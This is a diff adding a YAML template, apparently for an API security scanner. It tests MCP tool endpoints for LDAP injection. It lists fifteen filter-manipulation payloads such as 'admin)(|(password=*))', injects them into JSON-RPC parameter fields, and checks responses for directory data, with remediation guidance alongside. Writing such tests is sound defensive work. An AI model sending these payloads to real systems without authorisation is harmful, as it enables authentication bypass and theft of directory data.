@@ -1,0 +1,138 @@
+---
+id: MCP_LDAP_INJECTION_PARAMETER_INJECTION
+
+info:
+  name: "MCP: LDAP Injection Parameter Injection"
+  description: >
+    Tests whether MCP tool endpoints are vulnerable to LDAP injection attacks through
+    parameter manipulation. This test attempts to inject malicious LDAP queries into
+    function parameters to bypass authentication, extract sensitive directory data,
+    or manipulate LDAP operations.
+  details: >
+    Test idea:
+    - Inject LDAP injection payloads into various parameter fields of MCP tool calls
+    - Test common LDAP injection techniques including filter manipulation, attribute
+      injection, and query modification
+    - Attempt to bypass authentication, extract user data, and access sensitive
+      directory information
+    - Test for LDAP injection in different parameter contexts (search filters,
+      authentication, user queries, etc.)
+    - This template targets MCP endpoints that interact with LDAP directories and flags
+      successful LDAP injection attempts through response analysis.
+  impact: >
+    Successful LDAP injection through MCP parameters can lead to:
+    - Authentication bypass and privilege escalation
+    - Sensitive directory data exfiltration
+    - User credential and attribute access
+    - Directory structure disclosure
+    - Unauthorized user enumeration
+  remediation: |
+    To prevent LDAP injection through MCP parameters:
+    
+    1. **Input Validation**: Implement strict input validation for all LDAP parameters. Validate parameter types, formats, and ranges before processing.
+    
+    2. **Input Sanitization**: Sanitize all parameter values to remove or escape LDAP injection patterns and special characters.
+    
+    3. **Parameterized LDAP Queries**: Use parameterized LDAP queries where possible. Avoid concatenating user input directly into LDAP filters.
+    
+    4. **LDAP Filter Escaping**: Properly escape all user input before using it in LDAP filters to prevent injection attacks.
+    
+    5. **Access Controls**: Implement proper access controls for LDAP operations and verify user permissions before directory access.
+    
+    6. **Error Handling**: Implement secure error handling that doesn't reveal directory structure or internal system details.
+    
+    7. **Logging and Monitoring**: Log all LDAP access attempts and monitor for suspicious injection patterns.
+    
+    8. **Regular Security Testing**: Conduct regular security testing to identify and fix LDAP injection vulnerabilities.
+  category:
+    name: MCP_SECURITY
+    shortName: MCP_SEC
+    displayName: Model Context Protocol (MCP) Security
+  subCategory: MCP_LDAP_INJECTION_PARAMETER_INJECTION
+  severity: HIGH
+  tags:
+    - mcp
+    - ldap-injection
+    - parameter-injection
+    - directory-security
+    - llm-security
+  references:
+    - https://owasp.org/www-project-top-ten/2017/A1_2017-Injection
+    - https://cwe.mitre.org/data/definitions/90.html
+    - https://owasp.org/www-project-llm-security-top-10/
+  cwe:
+    - CWE-90
+    - CWE-20
+    - CWE-74
+  cve:
+    - CVE-2023-41031
+attributes:
+  nature: INTRUSIVE
+  plan: PRO
+  duration: FAST
+wordLists:
+  ldapInjectionPayloads:
+    - "admin)(&(password=*))"
+    - "admin)(|(password=*))"
+    - "admin)(!(password=*))"
+    - "admin)(&(objectClass=*))"
+    - "admin)(|(objectClass=*))"
+    - "admin)(!(objectClass=*))"
+    - "admin)(&(cn=*))"
+    - "admin)(|(cn=*))"
+    - "admin)(!(cn=*))"
+    - "admin)(&(uid=*))"
+    - "admin)(|(uid=*))"
+    - "admin)(!(uid=*))"
+    - "admin)(&(mail=*))"
+    - "admin)(|(mail=*))"
+    - "admin)(!(mail=*))"
+api_selection_filters:
+  response_code:
+    gte: 200
+    lt: 300
+  method:
+    eq: POST
+  request_payload:
+    contains_all:
+      - jsonrpc
+      - method
+      - params
+    for_one:
+      key:
+        regex: .*
+        extractMultiple: payloadKeys
+execute:
+  type: multiple
+  requests:
+    - req:
+        - modify_body_param:
+            params.arguments.${payloadKeys}: "${ldapInjectionPayloads}"
+        - add_body_param:
+            params.arguments.filter: "${ldapInjectionPayloads}"
+        - add_body_param:
+            params.arguments.query: "${ldapInjectionPayloads}"
+        - add_body_param:
+            params.arguments.search: "${ldapInjectionPayloads}"
+        - add_body_param:
+            params.arguments.user: "${ldapInjectionPayloads}"
+validate:
+  response_payload:
+    contains_either:
+      - "cn="
+      - "uid="
+      - "mail="
+      - "objectClass="
+      - "dn:"
+      - "ldap"
+      - "directory"
+      - "bind"
+      - "search"
+      - "filter"
+      - "attribute"
+      - "entry"
+      - "result"
+      - "error"
+      - "syntax"
+      - "invalid"
+      - "malformed"
